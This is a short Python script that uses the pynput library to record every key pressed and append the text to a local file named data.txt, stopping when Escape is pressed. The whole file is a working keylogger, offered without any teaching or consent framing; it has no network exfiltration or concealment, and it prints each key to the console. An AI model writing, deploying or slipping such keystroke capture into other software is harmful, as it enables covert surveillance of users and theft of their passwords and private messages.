import pynput    

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("data.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'" , "")
            if k.find("space") > 0:
                f.write(' ')
                k = k.replace("Key.space", "")
            if k.find("enter") > 0:
                f.write('\n')
                k = k.replace("Key.enter", "")
            elif k.find("Key") == -1:
                f.write(k)
            #f.write(str(key))
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    
    listener.join()
